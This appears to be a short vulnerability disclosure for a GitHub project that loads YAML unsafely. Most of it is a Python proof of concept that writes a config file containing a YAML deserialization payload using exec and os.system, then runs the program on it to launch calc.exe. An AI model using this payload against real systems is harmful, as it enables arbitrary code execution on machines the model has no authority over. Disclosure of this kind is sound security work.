# Description

`RolandGit95-InverseHeartActivity` is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

```python
import os

os.system('git clone https://github.com/RolandGit95/RolandGit95-InverseHeartActivity')
os.chdir('Reconstructing3D/')

payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""
open('config.yml','w+').write(payload)

os.system('python3 main.py -config config.yml')
```
* `python3 exploit.py`


# Impact

Arbitary Code Execution
